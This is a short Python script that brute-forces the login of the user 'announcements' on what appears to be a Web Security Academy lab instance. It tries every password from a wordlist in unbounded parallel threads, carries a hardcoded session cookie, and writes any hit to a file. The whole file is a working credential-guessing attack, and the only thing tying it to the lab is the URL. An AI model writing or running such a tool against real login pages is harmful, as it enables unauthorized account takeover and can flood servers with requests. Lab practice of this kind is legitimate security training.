#!/usr/bin/env python3

import requests
import threading
from tqdm import tqdm

url = "https://0a6c00ee047b6dd180bfe45c00ee00c5.web-security-academy.net/login"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Cookie": "session=xKcvxM6E9Y115Ub0SElT47b3Oj3yagml",
}

def try_login(username, password, progress_bar):
    payload = {
        'username': username,
        'password': password
    }
    
    try:
        response = requests.post(url, headers=headers, data=payload, timeout=10)
        
        if "Incorrect password" not in response.text:
            print(f"\nCorrect password for {username}: {password}")
            with open("correct_password.txt", "w") as log_file:
                log_file.write(f"{username}: {password}\n")
        
    except requests.exceptions.RequestException as e:
        print(f"Error with username {username} and password {password}: {e}")
    
    progress_bar.update(1)

def threaded_login(username, password, progress_bar):
    thread = threading.Thread(target=try_login, args=(username, password, progress_bar))
    thread.start()
    return thread

with open("passwords_db.txt", "r") as file:
    passwords = file.readlines()

passwords = [password.strip() for password in passwords]

import logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

threads = []

with tqdm(total=len(passwords), desc="Brute-forcing passwords for announcements", ncols=100) as progress_bar:
    for password in passwords:
        thread = threaded_login("announcements", password, progress_bar)
        threads.append(thread)

    for thread in threads:
        thread.join()

logging.info("Password brute-forcing completed!")
